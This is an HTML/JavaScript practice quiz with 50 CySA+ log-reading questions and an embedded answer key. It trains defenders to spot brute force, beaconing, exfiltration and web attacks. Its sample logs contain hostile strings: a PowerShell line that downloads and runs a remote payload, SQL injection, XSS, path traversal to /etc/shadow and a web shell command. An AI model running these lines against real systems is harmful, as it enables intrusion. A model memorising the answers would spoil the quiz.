@@ -1,0 +1,1036 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CySA+ 50-Question Log Reading Practice</title>
+<style>
+  :root{
+    --bg:#05070b;
+    --card:#111827;
+    --accent:#38bdf8;
+    --accent-soft:#0f172a;
+    --ink:#e5e7eb;
+    --muted:#9ca3af;
+    --good:#22c55e;
+    --bad:#ef4444;
+    --radius:16px;
+  }
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    font-family:system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    background:radial-gradient(circle at top, #111827 0, #020617 55%, #000 100%);
+    color:var(--ink);
+    padding:16px;
+  }
+  .app{
+    max-width:900px;
+    margin:0 auto;
+  }
+  header{
+    text-align:center;
+    margin-bottom:16px;
+  }
+  header h1{
+    font-size:1.4rem;
+    margin:0 0 6px;
+  }
+  header p{
+    margin:0;
+    font-size:0.9rem;
+    color:var(--muted);
+  }
+  .status-bar{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    font-size:0.9rem;
+    margin:12px 0 16px;
+    color:var(--muted);
+  }
+  .pill{
+    padding:4px 10px;
+    border-radius:999px;
+    background:rgba(15,23,42,0.9);
+    border:1px solid #1e293b;
+  }
+  .card{
+    background:rgba(15,23,42,0.95);
+    border-radius:var(--radius);
+    border:1px solid #1e293b;
+    padding:14px;
+    box-shadow:0 20px 40px rgba(0,0,0,0.55);
+  }
+  .log-box{
+    background:var(--accent-soft);
+    border-radius:var(--radius);
+    border:1px solid #1f2937;
+    padding:10px;
+    max-height:230px;
+    overflow:auto;
+    font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+    font-size:0.76rem;
+    margin-bottom:10px;
+    white-space:pre-wrap;
+  }
+  .question-text{
+    font-size:0.97rem;
+    margin:4px 0 10px;
+  }
+  .options{
+    display:flex;
+    flex-direction:column;
+    gap:8px;
+    margin-bottom:10px;
+  }
+  .option{
+    border-radius:999px;
+    border:1px solid #1f2937;
+    background:rgba(15,23,42,0.9);
+    padding:9px 12px;
+    text-align:left;
+    font-size:0.9rem;
+    cursor:pointer;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:8px;
+    transition:transform 0.05s ease, border-color 0.1s ease, background 0.1s ease;
+  }
+  .option span.label{
+    flex:1;
+  }
+  .option span.letter{
+    font-weight:600;
+    font-size:0.8rem;
+    opacity:0.8;
+  }
+  .option:hover{
+    transform:translateY(-1px);
+    border-color:var(--accent);
+  }
+  .option.selected{
+    border-color:var(--accent);
+    background:rgba(56,189,248,0.08);
+  }
+  .option.correct{
+    border-color:var(--good);
+    background:rgba(34,197,94,0.08);
+  }
+  .option.wrong{
+    border-color:var(--bad);
+    background:rgba(239,68,68,0.08);
+  }
+  .feedback{
+    min-height:20px;
+    font-size:0.88rem;
+  }
+  .feedback.good{color:var(--good);}
+  .feedback.bad{color:var(--bad);}
+  .nav-row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:10px;
+    margin-top:8px;
+  }
+  button.nav{
+    flex:1;
+    border-radius:999px;
+    border:none;
+    padding:9px 12px;
+    font-size:0.9rem;
+    cursor:pointer;
+    background:#0f172a;
+    color:var(--ink);
+    border:1px solid #1f2937;
+  }
+  button.nav.primary{
+    background:linear-gradient(135deg,#38bdf8,#22c55e);
+    border:none;
+    color:#020617;
+    font-weight:600;
+  }
+  button.nav:disabled{
+    opacity:0.4;
+    cursor:not-allowed;
+  }
+  .summary{
+    text-align:center;
+    margin-top:6px;
+    font-size:0.9rem;
+    color:var(--muted);
+  }
+  @media(max-width:600px){
+    .log-box{max-height:200px;font-size:0.7rem;}
+    .nav-row{flex-direction:column;}
+    button.nav{width:100%;}
+  }
+</style>
+</head>
+<body>
+<div class="app">
+  <header>
+    <h1>CySA+ Log Reading Practice (50 Questions)</h1>
+    <p>Read the logs, pick the most likely interpretation, and build PBQ muscle memory.</p>
+  </header>
+
+  <div class="status-bar">
+    <div class="pill" id="qProgress">Question 1 / 50</div>
+    <div class="pill" id="scoreBox">Score: 0</div>
+  </div>
+
+  <div class="card">
+    <div class="log-box" id="logBox"></div>
+    <div class="question-text" id="questionText"></div>
+
+    <div class="options" id="optionsContainer"></div>
+
+    <div class="feedback" id="feedback"></div>
+
+    <div class="nav-row">
+      <button class="nav" id="prevBtn">◀ Previous</button>
+      <button class="nav primary" id="nextBtn">Next ▶</button>
+    </div>
+    <div class="summary" id="summaryText"></div>
+  </div>
+</div>
+
+<script>
+const questions = [
+  // 1 SSH brute force
+  {
+    log: `Jan 10 03:11:22 web1 sshd[1923]: Failed password for invalid user admin from 203.0.113.55 port 55432 ssh2
+Jan 10 03:11:25 web1 sshd[1927]: Failed password for invalid user root from 203.0.113.55 port 55434 ssh2
+Jan 10 03:11:28 web1 sshd[1930]: Failed password for root from 203.0.113.55 port 55436 ssh2
+Jan 10 03:11:30 web1 sshd[1931]: Failed password for root from 203.0.113.55 port 55438 ssh2
+Jan 10 03:11:33 web1 sshd[1934]: Failed password for root from 203.0.113.55 port 55440 ssh2`,
+    question: "What is the MOST likely activity indicated by this log snippet?",
+    options: [
+      "Normal administrative SSH access",
+      "SSH brute-force attack against root",
+      "Legitimate password reset attempts",
+      "Port scanning of random services"
+    ],
+    correct: 1
+  },
+  // 2 Successful SSH after many failures
+  {
+    log: `Jan 10 03:11:22 web1 sshd[1923]: Failed password for root from 203.0.113.55 port 55432 ssh2
+Jan 10 03:11:25 web1 sshd[1927]: Failed password for root from 203.0.113.55 port 55434 ssh2
+Jan 10 03:11:58 web1 sshd[1950]: Accepted password for root from 203.0.113.55 port 55452 ssh2`,
+    question: "What should the analyst be MOST concerned about?",
+    options: [
+      "A misconfigured SSH banner",
+      "A potential successful compromise of the root account",
+      "An unpatched SSH version",
+      "Time drift on the system"
+    ],
+    correct: 1
+  },
+  // 3 Windows RDP brute force
+  {
+    log: `Log Name: Security
+Event ID: 4625
+Account For Which Logon Failed: Administrator
+Failure Reason: Unknown user name or bad password
+Logon Type: 10 (RemoteInteractive)
+Source Network Address: 198.51.100.77
+(This event repeats hundreds of times per minute)`,
+    question: "What is the MOST likely activity?",
+    options: [
+      "RemoteDesktop brute-force attack",
+      "Local physical logon attempt",
+      "Normal domain controller replication",
+      "Ransomware execution"
+    ],
+    correct: 0
+  },
+  // 4 Web SQL injection attempt
+  {
+    log: `203.0.113.10 - - [12/Jan/2025:09:22:41 +0000] "GET /login.php?user=admin' OR '1'='1'--&pass=test HTTP/1.1" 500 921 "-" "Mozilla/5.0"`,
+    question: "What attack is MOST likely being attempted?",
+    options: [
+      "Cross-site scripting (XSS)",
+      "SQL injection",
+      "Directory traversal",
+      "Command injection via shell"
+    ],
+    correct: 1
+  },
+  // 5 Web XSS attempt
+  {
+    log: `198.51.100.23 - - [13/Jan/2025:11:14:09 +0000] "GET /search?q=<script>alert('x')</script> HTTP/1.1" 400 32 "-" "curl/7.68.0"`,
+    question: "What attack type BEST matches this request?",
+    options: [
+      "Cross-site scripting",
+      "SQL injection",
+      "Local file inclusion",
+      "Session fixation"
+    ],
+    correct: 0
+  },
+  // 6 Directory traversal
+  {
+    log: `203.0.113.99 - - [13/Jan/2025:11:50:44 +0000] "GET /../../../../etc/passwd HTTP/1.1" 404 234 "-" "Mozilla/5.0"`,
+    question: "What is this request MOST likely trying to perform?",
+    options: [
+      "Path traversal",
+      "DNS exfiltration",
+      "Insecure deserialization",
+      "SMTP relay abuse"
+    ],
+    correct: 0
+  },
+  // 7 404 scanning
+  {
+    log: `198.51.100.10 - - [14/Jan/2025:02:03:11 +0000] "GET /wp-admin HTTP/1.1" 404 162 "-"
+198.51.100.10 - - [14/Jan/2025:02:03:11 +0000] "GET /phpmyadmin HTTP/1.1" 404 162 "-"
+198.51.100.10 - - [14/Jan/2025:02:03:11 +0000] "GET /admin HTTP/1.1" 404 162 "-"
+198.51.100.10 - - [14/Jan/2025:02:03:11 +0000] "GET /login HTTP/1.1" 404 162 "-"`,
+    question: "What is the MOST likely explanation for these log entries?",
+    options: [
+      "User forgot the correct URL",
+      "Automated scanner probing for common web admin paths",
+      "Normal health-check traffic",
+      "Web application backup job"
+    ],
+    correct: 1
+  },
+  // 8 Nmap SYN scan
+  {
+    log: `Jan 15 00:44:31 fw1 kernel: IN=eth0 OUT= MAC=00:15:5d:01:02:03 SRC=203.0.113.50 DST=192.0.2.10 LEN=60 TOS=0x00 PREC=0x00 TTL=50 ID=25013 DF PROTO=TCP SPT=55321 DPT=22 WINDOW=29200 SYN URGP=0
+Jan 15 00:44:31 fw1 kernel: IN=eth0 OUT= MAC=00:15:5d:01:02:03 SRC=203.0.113.50 DST=192.0.2.10 LEN=60 ... DPT=80 ... SYN
+Jan 15 00:44:31 fw1 kernel: IN=eth0 OUT= MAC=00:15:5d:01:02:03 SRC=203.0.113.50 DST=192.0.2.10 LEN=60 ... DPT=443 ... SYN`,
+    question: "What is MOST likely happening?",
+    options: [
+      "TCP SYN port scan",
+      "UDP flood DoS",
+      "SMurf attack",
+      "DNS amplification attack"
+    ],
+    correct: 0
+  },
+  // 9 UDP scan
+  {
+    log: `Jan 15 01:02:10 fw1 kernel: IN=eth0 SRC=203.0.113.60 DST=192.0.2.20 PROTO=UDP SPT=55332 DPT=53 LEN=44
+Jan 15 01:02:10 fw1 kernel: IN=eth0 SRC=203.0.113.60 DST=192.0.2.20 PROTO=UDP SPT=55332 DPT=67 LEN=44
+Jan 15 01:02:10 fw1 kernel: IN=eth0 SRC=203.0.113.60 DST=192.0.2.20 PROTO=UDP SPT=55332 DPT=161 LEN=44`,
+    question: "What does this pattern MOST likely indicate?",
+    options: [
+      "UDP port scanning",
+      "DNS amplification attack",
+      "DHCP starvation",
+      "Normal DNS resolution"
+    ],
+    correct: 0
+  },
+  // 10 DNS TXT exfil
+  {
+    log: `Jan 16 12:10:00 dns1 named[1444]: client 10.1.10.15#51422: query: f934jkf9sd9fk3j.example.com IN TXT
+Jan 16 12:10:01 dns1 named[1444]: client 10.1.10.15#51423: query: asl3kf9s90sdf.example.com IN TXT
+Jan 16 12:10:02 dns1 named[1444]: client 10.1.10.15#51424: query: 3kdf0s9sdf09s.example.com IN TXT`,
+    question: "What suspicious activity BEST matches this pattern?",
+    options: [
+      "DNS tunneling/exfiltration",
+      "Zone transfer",
+      "DNS cache poisoning",
+      "Domain hijacking"
+    ],
+    correct: 0
+  },
+  // 11 DNS tunneling high volume
+  {
+    log: `Jan 16 12:15:00 dns1 named[1444]: too many recursive queries from 10.1.10.15, throttling client
+(Thousands of TXT queries with random subdomains from same host)`,
+    question: "What is the MOST likely purpose of these queries?",
+    options: [
+      "Software update checks",
+      "DNS tunneling being used as a covert channel",
+      "Regular Active Directory SRV lookups",
+      "Time synchronization"
+    ],
+    correct: 1
+  },
+  // 12 Malware callback to C2
+  {
+    log: `NetFlow: Start=2025-01-17T02:00:00Z SrcIP=10.0.5.23 SrcPort=49122 DstIP=198.51.100.200 DstPort=443 Proto=TCP Bytes=1800 Packets=10
+NetFlow: Start=2025-01-17T02:05:00Z SrcIP=10.0.5.23 SrcPort=49124 DstIP=198.51.100.200 DstPort=443 Proto=TCP Bytes=1900 Packets=11
+NetFlow: Start=2025-01-17T02:10:00Z ... (repeats every 5 minutes, small amounts of data)`,
+    question: "What is the BEST description of this behavior?",
+    options: [
+      "Legitimate web browsing",
+      "Malware beaconing to a command-and-control server",
+      "Large data exfiltration",
+      "DNS zone transfer"
+    ],
+    correct: 1
+  },
+  // 13 Large outbound transfer
+  {
+    log: `NetFlow: Start=2025-01-17T23:59:00Z SrcIP=10.0.10.15 DstIP=203.0.113.200 DstPort=443 Bytes=4,294,967,295
+NetFlow: Start=2025-01-18T00:02:00Z SrcIP=10.0.10.15 DstIP=203.0.113.200 DstPort=443 Bytes=4,294,967,295
+NetFlow: Start=2025-01-18T00:06:00Z ...`,
+    question: "What is the MOST likely concern?",
+    options: [
+      "Failed TLS handshake",
+      "Data exfiltration of a large volume of information",
+      "DoS attack against internal host",
+      "ARP spoofing inside LAN"
+    ],
+    correct: 1
+  },
+  // 14 sudo escalation
+  {
+    log: `Jan 18 10:15:02 app1 sudo:  user01 : TTY=pts/1 ; PWD=/home/user01 ; USER=root ; COMMAND=/bin/bash
+Jan 18 10:15:03 app1 sudo: pam_unix(sudo:session): session opened for user root by user01(uid=1001)`,
+    question: "What did user01 just do?",
+    options: [
+      "Opened an SSH connection",
+      "Escalated to a root shell using sudo",
+      "Changed their own password",
+      "Created a cron job"
+    ],
+    correct: 1
+  },
+  // 15 New local admin created
+  {
+    log: `Log Name: Security
+Event ID: 4720
+A user account was created.
+New Account Name: tempadmin
+Creator: LOCALHOST\\Administrator`,
+    question: "What is the MOST significant risk indicated by this event?",
+    options: [
+      "New printer installed",
+      "Potential creation of a backdoor administrative account",
+      "Failed group policy update",
+      "Time synchronization failure"
+    ],
+    correct: 1
+  },
+  // 16 GPO modification
+  {
+    log: `Log Name: Security
+Event ID: 4739
+Domain Policy was changed.
+Changed Attributes: PasswordPolicy, LockoutPolicy
+Caller User Name: helpdesk01`,
+    question: "What should the analyst verify FIRST?",
+    options: [
+      "Whether the change was authorized",
+      "Antivirus signature version",
+      "Disk space usage",
+      "Number of domain controllers online"
+    ],
+    correct: 0
+  },
+  // 17 Suspicious PowerShell encoded
+  {
+    log: `Log Name: Windows PowerShell
+Event ID: 4104
+Message: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JAB...`,
+    question: "What is the BEST interpretation?",
+    options: [
+      "Normal PowerShell use",
+      "Potential malicious PowerShell with obfuscated script",
+      "Failed OS update",
+      "User launching Calculator"
+    ],
+    correct: 1
+  },
+  // 18 PowerShell download string
+  {
+    log: `powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.50/payload.ps1')"`,
+    question: "What phase of the attack lifecycle does this MOST likely represent?",
+    options: [
+      "Initial reconnaissance",
+      "Delivery / execution of malware",
+      "Data exfiltration",
+      "Account deprovisioning"
+    ],
+    correct: 1
+  },
+  // 19 SMB scanning
+  {
+    log: `Jan 19 01:22:11 fw1 DENY TCP 10.0.20.50:54321 -> 10.0.10.10:445
+Jan 19 01:22:11 fw1 DENY TCP 10.0.20.50:54321 -> 10.0.10.11:445
+Jan 19 01:22:11 fw1 DENY TCP 10.0.20.50:54321 -> 10.0.10.12:445 (continues through many IPs)`,
+    question: "What is the MOST likely activity?",
+    options: [
+      "SMB share enumeration across the subnet",
+      "VoIP call setup",
+      "DNS lookups for AD",
+      "Normal backup traffic"
+    ],
+    correct: 0
+  },
+  // 20 ARP spoofing
+  {
+    log: `IDS Alert: "ARP Cache Poisoning"
+SRC MAC: 00:11:22:33:44:55 claims IP: 10.0.0.1 (default gateway)
+Existing MAC for 10.0.0.1 is 00:aa:bb:cc:dd:ee`,
+    question: "What is the attacker MOST likely trying to do?",
+    options: [
+      "Launch a man-in-the-middle attack",
+      "Perform password spraying",
+      "Exploit SQL injection",
+      "Conduct DNS zone transfer"
+    ],
+    correct: 0
+  },
+  // 21 DHCP issue
+  {
+    log: `DHCP log:
+Many DISCOVER messages from 10.0.30.55 (MAC 00:de:ad:be:ef:01)
+Server reports: 'No free leases'`,
+    question: "What attack BEST matches the symptoms?",
+    options: [
+      "DHCP starvation attack",
+      "ARP poisoning",
+      "DNS spoofing",
+      "ICMP redirect attack"
+    ],
+    correct: 0
+  },
+  // 22 VPN foreign login
+  {
+    log: `VPN log:
+User: jdoe
+Login success: Source IP 203.0.113.88 (Country: RU)
+Last successful login: 10 minutes earlier from 198.51.100.25 (Country: US)`,
+    question: "What should the analyst suspect?",
+    options: [
+      "Normal roaming user",
+      "Account compromise with possible credential theft",
+      "Certificate expiration",
+      "Bandwidth overuse"
+    ],
+    correct: 1
+  },
+  // 23 Multiple failed VPN then success
+  {
+    log: `VPN:
+User: opsadmin
+Failed authentication: bad password (8 times)
+Then: Login success from same IP`,
+    question: "What is MOST likely occurring?",
+    options: [
+      "Password spraying against multiple accounts",
+      "User finally remembered correct password, but could signal brute forcing",
+      "MFA token drift",
+      "DNS load balancing"
+    ],
+    correct: 1
+  },
+  // 24 Email phishing clicked
+  {
+    log: `Secure email gateway:
+Recipient: user1@example.com
+Subject: "Urgent: Invoice overdue"
+URL clicked: http://malicious.example/bill/review`,
+    question: "What is the MOST appropriate classification?",
+    options: [
+      "Spam marketing",
+      "Phishing email with malicious link",
+      "Benign newsletter",
+      "Internal notification"
+    ],
+    correct: 1
+  },
+  // 25 Outbound spam
+  {
+    log: `Mail server:
+Outbound messages from user: hrassistant@example.com
+Normal volume: 20/day
+Today: 4,500 messages in 10 minutes to random domains`,
+    question: "What is the MOST likely issue?",
+    options: [
+      "HR sent an urgent memo",
+      "Mailbox is compromised and sending spam",
+      "Mail server backup",
+      "DNS misconfiguration"
+    ],
+    correct: 1
+  },
+  // 26 Proxy blocked category
+  {
+    log: `Proxy:
+User: jdoe
+URL: http://torrent-example.com
+Category: P2P/FileSharing
+Action: Blocked`,
+    question: "What security control is this log MOST likely from?",
+    options: [
+      "Firewall ACL",
+      "Web proxy with URL filtering",
+      "IDS signature",
+      "Antivirus quarantine log"
+    ],
+    correct: 1
+  },
+  // 27 IDS EternalBlue
+  {
+    log: `IDS Alert: "ETERNALBLUE MS17-010 exploit attempt"
+SrcIP: 203.0.113.120
+DstIP: 10.0.10.50
+DstPort: 445/TCP`,
+    question: "What system is MOST likely being targeted?",
+    options: [
+      "Linux web server",
+      "Windows SMB file server",
+      "DNS resolver",
+      "Mail gateway"
+    ],
+    correct: 1
+  },
+  // 28 IDS SQLi
+  {
+    log: `IDS Alert: "SQL Injection attempt in URI"
+HTTP GET /products?id=1;DROP+TABLE+users--`,
+    question: "What should the SOC analyst prioritize?",
+    options: [
+      "Blocking the attacking IP and checking web app for input validation",
+      "Rebooting the database",
+      "Restarting the DNS service",
+      "Resyncing NTP"
+    ],
+    correct: 0
+  },
+  // 29 AV detection quarantined
+  {
+    log: `AV log:
+Threat detected: Trojan.Generic.12345
+Action: Quarantined
+File: C:\\Users\\user1\\Downloads\\invoice.pdf.exe`,
+    question: "What is the BEST next step?",
+    options: [
+      "Ignore; AV fixed it",
+      "Investigate user activity and confirm no lateral movement",
+      "Delete the user account immediately",
+      "Disable DNS on the host"
+    ],
+    correct: 1
+  },
+  // 30 AV detection failed
+  {
+    log: `AV log:
+Threat detected: Ransomware.Locky
+Action: Failed - access denied
+File: C:\\Users\\user1\\AppData\\Roaming\\locky.exe`,
+    question: "What is the MOST urgent action?",
+    options: [
+      "Update antivirus signatures",
+      "Isolate the host from the network",
+      "Restart the host",
+      "Uninstall AV"
+    ],
+    correct: 1
+  },
+  // 31 Firewall deny inbound
+  {
+    log: `Firewall:
+Rule: default-deny
+Action: Block
+Src: 203.0.113.9:55555
+Dst: 198.51.100.10:3389`,
+    question: "What is MOST likely being attempted?",
+    options: [
+      "Inbound RDP attempt from Internet",
+      "SMTP relay",
+      "DNS zone transfer",
+      "NTP amplification"
+    ],
+    correct: 0
+  },
+  // 32 Firewall TOR
+  {
+    log: `Firewall:
+Action: Allow
+Src: 10.0.40.22
+Dst: 185.220.101.1
+DstPort: 9001
+Note: Destination identified as Tor exit node`,
+    question: "What risk does this log suggest?",
+    options: [
+      "Host running unauthorized Tor traffic",
+      "DNS cache poisoning",
+      "Wireless deauth attack",
+      "DHCP starvation"
+    ],
+    correct: 0
+  },
+  // 33 WAF blocked XSS
+  {
+    log: `WAF:
+Action: Block
+Rule: XSS-Filter
+Request URI: /search?q=<script>alert('test')</script>`,
+    question: "What is the WAF blocking?",
+    options: [
+      "SQL injection",
+      "Cross-site scripting attempt",
+      "Directory traversal",
+      "Command injection"
+    ],
+    correct: 1
+  },
+  // 34 WAF blocked traversal
+  {
+    log: `WAF:
+Action: Block
+Rule: PathTraversal
+Request URI: /download?file=../../../../etc/shadow`,
+    question: "What is happening?",
+    options: [
+      "DNS poisoning",
+      "Path traversal attack",
+      "ARP spoofing",
+      "Password spraying"
+    ],
+    correct: 1
+  },
+  // 35 DB failed logins
+  {
+    log: `DB audit:
+Login failed for user 'sa' from 203.0.113.25
+Login failed for user 'sa' from 203.0.113.25
+Login failed for user 'sa' from 203.0.113.25`,
+    question: "What is MOST likely being attempted?",
+    options: [
+      "Database brute force attack",
+      "Legitimate maintenance",
+      "Backup job",
+      "TLS handshake failure"
+    ],
+    correct: 0
+  },
+  // 36 Linux su attempts
+  {
+    log: `Jan 20 13:20:05 db1 su: pam_unix(su:auth): authentication failure; logname=user01 uid=1001 euid=0 tty=/dev/pts/1 ruser=user01 rhost=  user=root
+Jan 20 13:20:07 db1 su: FAILED su for root by user01`,
+    question: "What is MOST likely occurring?",
+    options: [
+      "Normal package installation",
+      "User attempting to switch to root with wrong password",
+      "DNS configuration change",
+      "Time sync issue"
+    ],
+    correct: 1
+  },
+  // 37 Cron job added
+  {
+    log: `/var/log/cron:
+Jan 20 14:00:01 srv1 CRON[2501]: (root) CMD (/usr/bin/python /tmp/.hidden.py)`,
+    question: "What should an analyst be MOST suspicious of?",
+    options: [
+      "A normal scheduled backup script",
+      "Possible persistence mechanism using a hidden script",
+      "NTP configuration",
+      "DHCP lease renewal"
+    ],
+    correct: 1
+  },
+  // 38 CloudTrail recon
+  {
+    log: `AWS CloudTrail:
+User: analyst-role
+API calls over 5 minutes:
+DescribeInstances, DescribeSecurityGroups, DescribeNetworkAcls, DescribeSubnets, DescribeRouteTables (hundreds of times)`,
+    question: "What is this pattern MOST indicative of?",
+    options: [
+      "Reconnaissance of cloud environment",
+      "Data exfiltration from S3",
+      "Lambda function deployment",
+      "Normal CloudWatch logging"
+    ],
+    correct: 0
+  },
+  // 39 CloudTrail unauthorized API
+  {
+    log: `AWS CloudTrail:
+User: app-prod
+Event: UnauthorizedOperation
+API: s3:PutBucketAcl
+Error: AccessDenied`,
+    question: "What BEST explanation fits this event?",
+    options: [
+      "Malware infection",
+      "Attempt to modify bucket permissions without adequate rights",
+      "Normal key rotation",
+      "CloudTrail disabled"
+    ],
+    correct: 1
+  },
+  // 40 S3 public access
+  {
+    log: `AWS Config:
+Change: S3 bucket 'hr-data-backup' ACL -> public-read`,
+    question: "What is the MOST critical concern?",
+    options: [
+      "Increased storage costs",
+      "Exposure of sensitive data due to public bucket",
+      "Slow performance",
+      "Lambda cold starts"
+    ],
+    correct: 1
+  },
+  // 41 Azure AD impossible travel
+  {
+    log: `Azure AD Sign-ins:
+User: alex
+Successful sign-in: 09:00 from US
+Successful sign-in: 09:15 from JP
+Risk: 'Impossible travel' flagged`,
+    question: "What does this MOST likely indicate?",
+    options: [
+      "VPN misconfiguration only",
+      "Possible credential compromise used from multiple locations",
+      "DNS poisoning",
+      "OK because user is on vacation"
+    ],
+    correct: 1
+  },
+  // 42 Windows 4625 failures
+  {
+    log: `Event ID: 4625
+An account failed to log on.
+Account Name: svc-backup
+Failure Reason: Account locked out
+(This event repeats every 5 minutes)`,
+    question: "What is MOST likely happening?",
+    options: [
+      "Normal login failures due to expired password",
+      "Service using old credentials repeatedly causing lockouts",
+      "DoS attack on domain controller",
+      "Group policy refresh"
+    ],
+    correct: 1
+  },
+  // 43 Windows 4720 user created
+  {
+    log: `Event ID: 4720
+A user account was created.
+New Account Name: support-temp
+Creator: DOMAIN\\user02`,
+    question: "From a security perspective, what should you do?",
+    options: [
+      "Immediately delete the account",
+      "Verify the creation is part of an approved change/request",
+      "Disable all domain accounts",
+      "Restart the server"
+    ],
+    correct: 1
+  },
+  // 44 Windows 4672 special privileges
+  {
+    log: `Event ID: 4672
+Special privileges assigned to new logon.
+Account Name: tempadmin`,
+    question: "What is MOST likely true about 'tempadmin'?",
+    options: [
+      "It has no special rights",
+      "It has elevated privileges such as local or domain admin",
+      "It is a guest account",
+      "It is a service that failed to start"
+    ],
+    correct: 1
+  },
+  // 45 VPN concurrent locations
+  {
+    log: `VPN:
+User: csmith
+Active session from 192.0.2.10 (US)
+New login from 203.0.113.200 (DE) - concurrent session`,
+    question: "What is the MOST likely security concern?",
+    options: [
+      "Certificate expiration",
+      "Credentials being used by more than one person/location",
+      "DNS misconfiguration",
+      "Firewall misrule"
+    ],
+    correct: 1
+  },
+  // 46 Odd user-agent
+  {
+    log: `Proxy:
+User: finance01
+URL: https://login.examplebank.com
+User-Agent: python-requests/2.28
+Action: Allowed`,
+    question: "Why is this notable?",
+    options: [
+      "User is using Chrome",
+      "Automated script/tool hitting banking site instead of browser",
+      "TLS is disabled",
+      "DNSSEC is misconfigured"
+    ],
+    correct: 1
+  },
+  // 47 Webshell indicator
+  {
+    log: `Web server:
+"POST /uploads/logo.php HTTP/1.1" 200
+Immediately followed by:
+"GET /uploads/logo.php?cmd=whoami HTTP/1.1" 200`,
+    question: "What is MOST likely occurring?",
+    options: [
+      "Normal file upload testing",
+      "Web shell upload and remote command execution",
+      "DNS tunneling",
+      "SQL backup"
+    ],
+    correct: 1
+  },
+  // 48 Botnet traffic
+  {
+    log: `IDS:
+Alert: "Outbound connection to known botnet C2"
+SrcIP: 10.0.60.21
+DstIP: 198.51.100.250
+Reputation: Malicious`,
+    question: "What is the MOST appropriate immediate response?",
+    options: [
+      "Reboot the IPS",
+      "Isolate the infected host from the network",
+      "Disable DNS on firewall",
+      "Ignore if user is developer"
+    ],
+    correct: 1
+  },
+  // 49 High outbound to single IP
+  {
+    log: `NetFlow summary:
+SrcIP: 10.0.70.10
+DstIP: 203.0.113.77
+Total Bytes (1 hour): 900 GB
+DstPort: 22`,
+    question: "What is the MOST likely explanation from a security viewpoint?",
+    options: [
+      "Normal SSH administration",
+      "Potential bulk data exfiltration over SSH",
+      "DNS sinkhole",
+      "VoIP call"
+    ],
+    correct: 1
+  },
+  // 50 DB errors after injection
+  {
+    log: `Web logs:
+"GET /app/item?id=1;DROP+TABLE+orders-- HTTP/1.1" 500
+DB logs:
+ERROR: syntax error at or near "DROP"`,
+    question: "What should the analyst conclude?",
+    options: [
+      "Application is patched against XSS",
+      "SQL injection attempt caused errors but may not have succeeded",
+      "DNS is misconfigured",
+      "ICMP is blocked"
+    ],
+    correct: 1
+  }
+];
+
+let current = 0;
+let score = 0;
+
+// Track state per question
+questions.forEach(q => {
+  q.userAnswer = null;
+  q.gotCorrect = false; // correct on any previous click?
+});
+
+const logBox = document.getElementById('logBox');
+const questionText = document.getElementById('questionText');
+const optionsContainer = document.getElementById('optionsContainer');
+const feedback = document.getElementById('feedback');
+const qProgress = document.getElementById('qProgress');
+const scoreBox = document.getElementById('scoreBox');
+const prevBtn = document.getElementById('prevBtn');
+const nextBtn = document.getElementById('nextBtn');
+const summaryText = document.getElementById('summaryText');
+
+function renderQuestion() {
+  const q = questions[current];
+  logBox.textContent = q.log;
+  questionText.textContent = q.question;
+  feedback.textContent = "";
+  feedback.className = "feedback";
+  qProgress.textContent = `Question ${current+1} / ${questions.length}`;
+  scoreBox.textContent = `Score: ${score}`;
+  summaryText.textContent = "";
+
+  optionsContainer.innerHTML = "";
+  const letters = ["A","B","C","D"];
+  q.options.forEach((opt, idx) => {
+    const btn = document.createElement('button');
+    btn.className = "option";
+    btn.type = "button";
+    btn.dataset.index = idx;
+    btn.innerHTML = `<span class="letter">${letters[idx]}</span><span class="label">${opt}</span>`;
+    if (q.userAnswer === idx) {
+      btn.classList.add('selected');
+      if (idx === q.correct) btn.classList.add('correct');
+      else btn.classList.add('wrong');
+    }
+    btn.addEventListener('click', () => handleAnswer(idx));
+    optionsContainer.appendChild(btn);
+  });
+
+  prevBtn.disabled = current === 0;
+  nextBtn.textContent = current === questions.length-1 ? "Finish" : "Next ▶";
+}
+
+function handleAnswer(idx) {
+  const q = questions[current];
+
+  // Update selection styling
+  const optionButtons = optionsContainer.querySelectorAll('.option');
+  optionButtons.forEach(btn => {
+    btn.classList.remove('selected','correct','wrong');
+  });
+
+  const selectedBtn = optionButtons[idx];
+  selectedBtn.classList.add('selected');
+
+  if (idx === q.correct) {
+    selectedBtn.classList.add('correct');
+    feedback.textContent = "Correct!";
+    feedback.classList.add('good');
+    if (!q.gotCorrect) {
+      score++;
+      q.gotCorrect = true;
+      scoreBox.textContent = `Score: ${score}`;
+    }
+  } else {
+    selectedBtn.classList.add('wrong');
+    feedback.textContent = "Not quite. Try another option.";
+    feedback.classList.add('bad');
+  }
+
+  q.userAnswer = idx;
+}
+
+prevBtn.addEventListener('click', () => {
+  if (current > 0) {
+    current--;
+    renderQuestion();
+  }
+});
+
+nextBtn.addEventListener('click', () => {
+  if (current < questions.length - 1) {
+    current++;
+    renderQuestion();
+  } else {
+    // show final summary
+    summaryText.textContent = `Completed! Final score: ${score} out of ${questions.length}.`;
+  }
+});
+
+// initial render
+renderQuestion();
+</script>
+</body>
+</html>
